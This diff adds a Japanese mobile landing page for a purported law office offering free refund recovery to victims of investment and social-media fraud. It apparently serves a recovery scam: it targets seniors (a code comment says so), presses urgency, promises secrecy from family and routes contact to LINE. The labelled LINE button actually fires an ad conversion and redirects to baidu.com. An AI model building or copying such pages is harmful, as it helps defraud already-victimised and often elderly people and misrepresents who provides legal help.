@@ -1,0 +1,297 @@
+---
+import BaseLayout from '../../../../layouts/BaseLayout.astro';
+import { ArrowRight, ShieldCheck, Info, CheckCircle2, Scale, AlertOctagon, UserCheck, Lock, Clock } from 'lucide-react';
+---
+
+<BaseLayout title="東雲総合法律事務所 | 詐欺被害返金相談窓口" lang="ja">
+  <Fragment slot="head">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@400;500;700;900&family=Noto+Serif+JP:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <script is:inline>
+      window.onLinkBtnClick = function () {
+        const link = 'https://www.baidu.com';
+        if (typeof gtag_report_conversion === 'function') {
+          gtag_report_conversion();
+        }
+        setTimeout(() => {
+          window.location.href = link;
+        }, 100);
+      };
+    </script>
+    <style is:global>
+      :root {
+        --color-navy: #1A2942;
+        --color-navy-light: #2A3F63;
+        --color-gold: #C5A365;
+        --color-gold-light: #DFCA9F;
+        --color-paper: #FDFBF7;
+        --color-text: #2C2C2C;
+        --color-text-light: #5A5A5A;
+        --color-alert: #D32F2F;
+        --color-line: #06C755;
+      }
+
+      body {
+        font-family: 'Noto Sans JP', sans-serif;
+        background-color: var(--color-paper);
+        color: var(--color-text);
+        font-size: 16px;
+        line-height: 1.7;
+        -webkit-font-smoothing: antialiased;
+        letter-spacing: 0.03em;
+      }
+
+      .font-serif {
+        font-family: 'Noto Serif JP', serif;
+      }
+
+      /* Premium Washi Paper Texture */
+      .bg-washi {
+        background-color: var(--color-paper);
+        background-image: url("data:image/svg+xml,%3Csvg width='200' height='200' viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='200' height='200' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+      }
+
+      /* Elegant gradients */
+      .bg-gradient-gold {
+        background: linear-gradient(135deg, var(--color-gold) 0%, #E6C887 100%);
+      }
+      .bg-gradient-navy {
+        background: linear-gradient(135deg, var(--color-navy) 0%, var(--color-navy-light) 100%);
+      }
+
+      /* Soft, premium shadows */
+      .shadow-elegant {
+        box-shadow: 0 10px 30px rgba(26, 41, 66, 0.08);
+      }
+      .shadow-btn {
+        box-shadow: 0 4px 0 #049A42, 0 8px 16px rgba(6, 199, 85, 0.3);
+      }
+      .btn-active:active {
+        transform: translateY(4px);
+        box-shadow: 0 0 0 #049A42;
+      }
+
+      /* Image mask transition */
+      .fade-mask {
+        mask-image: linear-gradient(to bottom, rgba(0,0,0,1) 60%, rgba(0,0,0,0) 100%);
+        -webkit-mask-image: linear-gradient(to bottom, rgba(0,0,0,1) 60%, rgba(0,0,0,0) 100%);
+      }
+    </style>
+  </Fragment>
+
+  <!-- Mobile Wrapper with Paper Texture -->
+  <main class="max-w-[430px] mx-auto min-h-screen bg-washi relative pb-40 shadow-2xl border-x border-[#EAE5D9]">
+
+    <!-- Elegant Header -->
+    <header class="bg-white/95 backdrop-blur-md px-5 py-3.5 border-b border-[#EAE5D9] flex items-center justify-between sticky top-0 z-50 shadow-sm">
+      <div class="flex items-center gap-2.5">
+        <div class="w-8 h-8 rounded-full overflow-hidden bg-white shadow-sm border border-[#EAE5D9]">
+          <img src="/JP/律师/images/logo-shinonome-2026.png" alt="Logo" class="w-full h-full object-cover" />
+        </div>
+        <div class="flex flex-col">
+          <span class="font-serif font-bold text-[16px] text-[var(--color-navy)] leading-tight tracking-wide">東雲総合法律事務所</span>
+          <span class="text-[9px] text-[var(--color-gold)] font-bold tracking-widest mt-0.5">SHINONOME LAW OFFICE</span>
+        </div>
+      </div>
+      <div class="text-[11px] font-bold text-[var(--color-gold)] border border-[var(--color-gold-light)] px-2.5 py-1 rounded-sm bg-[var(--color-gold)]/5">
+        全国対応・秘密厳守
+      </div>
+    </header>
+
+    <!-- Hero Section (Using the newly generated AI Image) -->
+    <section class="relative bg-[var(--color-navy)] text-white overflow-hidden">
+      <!-- Generated AI Image Background -->
+      <div class="absolute inset-0 z-0 fade-mask">
+        <img src="/JP/律师/images/hero-bg-2026.png" alt="安心の相談空間" class="w-full h-full object-cover opacity-40 mix-blend-overlay" />
+      </div>
+
+      <div class="relative z-10 px-5 pt-10 pb-16">
+        <div class="inline-flex items-center gap-1.5 bg-[var(--color-gold)] text-white px-3 py-1 text-[13px] font-bold rounded-sm mb-6 shadow-md">
+          <span class="tracking-widest">投資・副業・SNS詐欺にお悩みの方へ</span>
+        </div>
+
+        <h1 class="font-serif text-[32px] font-black leading-[1.3] mb-5 tracking-tight drop-shadow-lg">
+          奪われたお金は、<br/>
+          <span class="text-[var(--color-gold-light)]">取り戻せる</span><br/>
+          可能性があります。
+        </h1>
+
+        <p class="text-[15px] text-white/90 font-medium leading-[1.8] mb-8 max-w-[280px]">
+          「連絡が取れない」「出金できない」<br/>
+          少しでも不安を感じたら、相手が証拠を隠す前に、法的手続きへ踏み出しましょう。
+        </p>
+
+        <!-- Trust Badges -->
+        <div class="bg-white/10 backdrop-blur-md border border-white/20 rounded-xl p-4">
+          <h2 class="font-serif font-bold text-[18px] text-[var(--color-gold-light)] mb-3 pb-2 border-b border-white/10 flex items-center gap-2">
+            <ShieldCheck class="w-5 h-5" />
+            当窓口の３つのお約束
+          </h2>
+          <ul class="text-[14px] space-y-3 font-medium">
+            <li class="flex items-center gap-2.5">
+              <CheckCircle2 class="w-5 h-5 text-[var(--color-gold)] flex-shrink-0" />
+              <span>ご相談・調査は何度でも<span class="text-[#FF7676] font-bold">無料</span>です</span>
+            </li>
+            <li class="flex items-center gap-2.5">
+              <CheckCircle2 class="w-5 h-5 text-[var(--color-gold)] flex-shrink-0" />
+              <span>ご家族や職場に知られずに対応可能</span>
+            </li>
+            <li class="flex items-center gap-2.5">
+              <CheckCircle2 class="w-5 h-5 text-[var(--color-gold)] flex-shrink-0" />
+              <span>お手元のスマートフォンから簡単相談</span>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- Spacer / Overlap -->
+    <div class="h-6"></div>
+
+    <!-- Reality Check Section (Gentle yet authoritative) -->
+    <section class="px-5 py-6">
+      <div class="bg-white rounded-2xl shadow-elegant border border-[#EAE5D9] overflow-hidden">
+        <!-- Trust Authority Image Header -->
+        <div class="relative h-40 w-full">
+          <img src="/JP/律师/images/trust-law-2026.png" alt="法律の専門家" class="w-full h-full object-cover" />
+          <div class="absolute inset-0 bg-gradient-to-t from-white via-white/20 to-transparent"></div>
+        </div>
+
+        <div class="px-6 pb-6 pt-2 relative z-10">
+          <div class="flex flex-col items-center mb-6 text-center">
+            <div class="w-12 h-12 bg-[#FFF0F0] rounded-full flex items-center justify-center mb-3 shadow-sm border border-[#FEE2E2]">
+              <AlertOctagon class="w-6 h-6 text-[var(--color-alert)]" />
+            </div>
+            <h2 class="font-serif font-bold text-[22px] text-[var(--color-navy)] leading-tight">
+              ご注意ください
+            </h2>
+            <p class="text-[14px] text-[var(--color-text-light)] mt-2 font-medium">以下のケースは、詐欺の疑いが極めて濃厚です</p>
+          </div>
+
+        <div class="space-y-3 mb-6">
+          {[
+            { text: "LINEなどの「投資グループ」に突然追加された" },
+            { text: "利益を引き出すために「税金・手数料」を請求された" },
+            { text: "振込先が毎回違う「個人名義」や「関係ない会社」" },
+            { text: "「絶対に儲かる」「元本保証」と強く勧められた" }
+          ].map((item, i) => (
+            <div class="flex items-start gap-3 p-3.5 bg-[var(--color-paper)] rounded-lg border border-[#EAE5D9]">
+              <div class="bg-white shadow-sm border border-[#EAE5D9] text-[var(--color-alert)] font-bold rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 mt-0.5 text-[14px]">
+                !
+              </div>
+              <p class="text-[15px] font-medium text-[var(--color-text)] leading-snug">{item.text}</p>
+            </div>
+          ))}
+        </div>
+
+        <!-- Warning Note -->
+        <div class="bg-gradient-to-br from-[#FFF8F8] to-white border-l-4 border-[var(--color-alert)] p-4 rounded-r-lg">
+          <p class="text-[15px] font-bold text-[var(--color-alert)] mb-1 flex items-center gap-1.5">
+            <Clock class="w-4 h-4" /> 専門家からの警告
+          </p>
+          <p class="text-[14px] font-medium leading-relaxed text-[var(--color-text)]">
+            「もう少し待てば出金できる」は常套手段です。信じて待つ間に、相手は資金を隠してしまいます。<span class="bg-[#FFF0F0] text-[var(--color-alert)] px-1 font-bold">1日でも早いご相談</span>が、返金成功の分かれ道となります。
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Support Process -->
+    <section class="px-5 py-8 mt-4 bg-white border-y border-[#EAE5D9]">
+      <div class="relative w-full h-[140px] rounded-2xl overflow-hidden mb-8 shadow-sm">
+        <img src="/JP/律师/images/empathy-consult-2026.png" class="w-full h-full object-cover" alt="安心の相談環境" />
+        <div class="absolute inset-0 bg-[var(--color-navy)]/40 flex items-center justify-center">
+          <h2 class="font-serif font-bold text-[24px] text-white tracking-widest drop-shadow-md">
+            解決までの流れ
+          </h2>
+        </div>
+      </div>
+
+      <div class="space-y-4">
+
+        {/* Step 1 */}
+        <div class="bg-white rounded-xl p-5 shadow-sm border border-[#EAE5D9] relative overflow-hidden">
+          <div class="absolute top-0 right-0 w-24 h-24 bg-[var(--color-paper)] rounded-bl-full -z-0"></div>
+          <div class="relative z-10 flex gap-4">
+            <div class="w-12 h-12 rounded-full bg-gradient-navy text-white font-serif font-bold text-[20px] flex items-center justify-center flex-shrink-0 shadow-md">
+              1
+            </div>
+            <div>
+              <h3 class="font-bold text-[18px] text-[var(--color-navy)] mb-1.5 flex items-center gap-2">
+                無料相談 <span class="bg-[var(--color-gold)]/10 text-[var(--color-gold)] text-[11px] px-2 py-0.5 rounded-sm line-through0">LINE対応</span>
+              </h3>
+              <p class="text-[14px] text-[var(--color-text-light)] leading-relaxed font-medium mb-0">お手元のスマートフォンから状況をお知らせください。しつこい勧誘などは一切ございません。</p>
+            </div>
+          </div>
+        </div>
+
+        {/* Step 2 */}
+        <div class="bg-white rounded-xl p-5 shadow-sm border border-[#EAE5D9] relative overflow-hidden">
+          <div class="absolute top-0 right-0 w-24 h-24 bg-[var(--color-paper)] rounded-bl-full -z-0"></div>
+          <div class="relative z-10 flex gap-4">
+            <div class="w-12 h-12 rounded-full bg-gradient-navy text-white font-serif font-bold text-[20px] flex items-center justify-center flex-shrink-0 shadow-md">
+              2
+            </div>
+            <div>
+              <h3 class="font-bold text-[18px] text-[var(--color-navy)] mb-1.5">無料の状況調査</h3>
+              <p class="text-[14px] text-[var(--color-text-light)] leading-relaxed font-medium mb-0">いただいた情報をもとに、法律の専門家が「返金が可能かどうか」を徹底的に調査いたします。</p>
+            </div>
+          </div>
+        </div>
+
+        {/* Step 3 */}
+        <div class="bg-white rounded-xl p-5 shadow-sm border border-[#EAE5D9] relative overflow-hidden">
+          <div class="absolute top-0 right-0 w-24 h-24 bg-[#FFF0F0] rounded-bl-full -z-0"></div>
+          <div class="relative z-10 flex gap-4">
+            <div class="w-12 h-12 rounded-full bg-gradient-gold text-white font-serif font-bold text-[20px] flex items-center justify-center flex-shrink-0 shadow-md">
+              3
+            </div>
+            <div>
+              <h3 class="font-bold text-[18px] text-[var(--color-alert)] mb-1.5">口座凍結・返金請求</h3>
+              <p class="text-[14px] text-[var(--color-text-light)] leading-relaxed font-medium mb-0">ご納得の上で依頼後、直ちに相手方の口座凍結や返金請求といった法的手続きを実行します。</p>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- Bottom Padding -->
+    <div class="h-10"></div>
+
+    <!-- Sticky Bottom CTA for Seniors -->
+    <div class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-[430px] bg-white/95 backdrop-blur-xl border-t border-[#EAE5D9] px-4 pt-3 pb-6 z-50 shadow-[0_-10px_30px_rgba(0,0,0,0.05)]">
+      <div class="text-center mb-2.5">
+        <span class="inline-flex items-center gap-1.5 bg-[#E8F8EE] text-[var(--color-line)] px-3 py-1 rounded-full text-[13px] font-bold border border-[#bcebcf]">
+          <span class="w-2 h-2 rounded-full bg-[var(--color-line)] animate-pulse"></span>
+          スマートフォンから24時間受付中
+        </span>
+      </div>
+
+      <button
+        onclick="onLinkBtnClick()"
+        class="w-full bg-[var(--color-line)] hover:bg-[#05b34c] text-white py-4 px-4 rounded-xl flex items-center justify-center gap-3 shadow-btn btn-active transition-all duration-100 relative group"
+      >
+        <div class="bg-white/20 p-1.5 rounded-lg absolute left-4 drop-shadow-sm">
+          <svg class="w-6 h-6 fill-white" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M24 10.304c0-5.369-5.383-9.738-12-9.738-6.616 0-12 4.369-12 9.738 0 4.814 4.269 8.846 10.036 9.608.391.084.922.258.822.582l-.266 1.631c-.027.166-.013.333.042.485.054.152.152.285.281.381.129.096.288.15.454.155s.329-.039.467-.123c.314-.192 3.635-2.227 5.738-4.226 3.996-3.805 6.426-8.156 6.426-8.493z"/></svg>
+        </div>
+        <div class="flex flex-col items-center">
+          <span class="font-bold text-[18px] tracking-wide drop-shadow-sm">こちらをタップして</span>
+          <span class="font-black text-[22px] tracking-wide drop-shadow-sm leading-tight">LINEで相談する</span>
+        </div>
+        <ArrowRight class="w-6 h-6 absolute right-4 transition-transform group-hover:translate-x-1" />
+      </button>
+
+      <div class="text-center mt-3.5 flex items-center justify-center gap-4">
+        <p class="text-[12px] text-[var(--color-text-light)] font-medium flex items-center gap-1">
+          <Lock class="w-3.5 h-3.5 text-[var(--color-gold)]" /> 家族に秘密で相談可能
+        </p>
+        <p class="text-[12px] text-[var(--color-text-light)] font-medium flex items-center gap-1">
+          <UserCheck class="w-3.5 h-3.5 text-[var(--color-gold)]" /> 無料・匿名OK
+        </p>
+      </div>
+    </div>
+
+  </main>
+</BaseLayout>
